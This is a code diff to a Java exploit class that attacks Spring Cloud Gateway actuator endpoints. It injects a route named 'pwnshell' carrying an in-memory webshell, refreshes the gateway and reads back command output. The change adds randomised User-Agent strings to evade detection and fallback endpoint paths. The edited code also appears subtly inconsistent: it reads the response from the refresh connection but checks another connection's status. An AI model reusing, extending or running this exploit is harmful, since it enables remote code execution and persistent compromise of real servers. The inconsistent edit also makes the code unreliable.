@@ -1,6 +1,7 @@
 package src.main.Exp.ExpCore;
 
 import src.main.LoadLib.MemshellLoad.MemshellLoad;
+import src.main.common.UA_Config;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -8,6 +9,8 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.stream.Stream;
@@ -20,6 +23,9 @@ public class ExpCore {
     public Stream<String> ShellGaw() throws IOException {
         Stream.Builder<String> builder = Stream.builder();
         String res = "";
+        String ua = "";
+        String refapi = "";
+        String api = "";
         String data =
                 "{\n" +
                         "  \"id\": \"pwnshell\",\n" +
@@ -35,32 +41,46 @@ public class ExpCore {
         MemshellLoad ms = new MemshellLoad();
         String shell = ms.run();
         String shellData = String.format(data,shell);
-        String api = "/actuator/gateway/routes/pwnshell";
-        String refapi = "/actuator/gateway/refresh";
-        String site = address + api;
-        URL urlobj = new URL(site);
-        HttpURLConnection conn = (HttpURLConnection) urlobj.openConnection();
-        conn.setRequestMethod("POST");
-        conn.setRequestProperty("Content-Type", "application/json");
+        URL obj = new URL(address + "/actuator/env");
+        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+        UA_Config uacf = new UA_Config();
+        List<String> ualist = uacf.loadUserAgents();
+        ua = uacf.getRandomUserAgent(ualist);
+        conn.setRequestProperty("User-Agent",ua);
+        conn.setRequestMethod("GET");
         conn.setDoOutput(true);
-        try (OutputStream os = conn.getOutputStream()) {
-            byte[] input = shellData.getBytes("utf-8");
+        int responseCode = conn.getResponseCode();
+        if (responseCode == HttpURLConnection.HTTP_OK){
+            api = "/actuator/gateway/routes/pwnshell";
+            refapi = "/actuator/gateway/refresh";
+        }else {
+            api = "/gateway/routes/pwnshell";
+            refapi = "/gateway/refresh";
+        }
+        String site = address + api;
+        URL obj1 = new URL(site);
+        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+        conn1.setRequestMethod("POST");
+        conn1.setRequestProperty("Content-Type", "application/json");
+        conn1.setDoOutput(true);
+        try (OutputStream os = conn1.getOutputStream()) {
+            byte[] input = shellData.getBytes(StandardCharsets.UTF_8);
             os.write(input, 0, input.length);
         }
-        int responseCode = conn.getResponseCode();
-        if (responseCode == HttpURLConnection.HTTP_CREATED){
+        int responseCode1 = conn1.getResponseCode();
+        if (responseCode1 == HttpURLConnection.HTTP_CREATED){
             String site1 = address + refapi;
-            URL urlobj1 = new URL(site1);
-            HttpURLConnection conn1 = (HttpURLConnection) urlobj1.openConnection();
-            conn1.setRequestMethod("POST");
-            conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
-            conn1.setDoOutput(true);
-            int responseCode1 = conn1.getResponseCode();
-            if (responseCode1 == HttpURLConnection.HTTP_OK){
-                URL urlobj2 = new URL(site);
-                HttpURLConnection conn2 = (HttpURLConnection) urlobj2.openConnection();
-                conn2.setRequestMethod("GET");
-                conn2.setDoOutput(true);
+            URL obj2 = new URL(site1);
+            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+            conn2.setRequestMethod("POST");
+            conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
+            conn2.setDoOutput(true);
+            int responseCode2 = conn2.getResponseCode();
+            if (responseCode2 == HttpURLConnection.HTTP_OK){
+                URL obj3 = new URL(site);
+                HttpURLConnection conn3 = (HttpURLConnection) obj3.openConnection();
+                conn3.setRequestMethod("GET");
+                conn3.setDoOutput(true);
                 BufferedReader in = new BufferedReader(new InputStreamReader(conn2.getInputStream()));
                 String inputLine;
                 StringBuilder content = new StringBuilder();
@@ -68,8 +88,8 @@ public class ExpCore {
                     content.append(inputLine);
                     res = inputLine.toString();
                 }
-                int responseCode2 = conn2.getResponseCode();
-                if (responseCode2 == HttpURLConnection.HTTP_OK){
+                int responseCode3 = conn3.getResponseCode();
+                if (responseCode3 == HttpURLConnection.HTTP_OK){
                     if (res.contains("pwnshell")) {
                         String resultPattern = "Result\\s*=\\s*'([^\\n]*)'";
                         Pattern pattern = Pattern.compile(resultPattern);
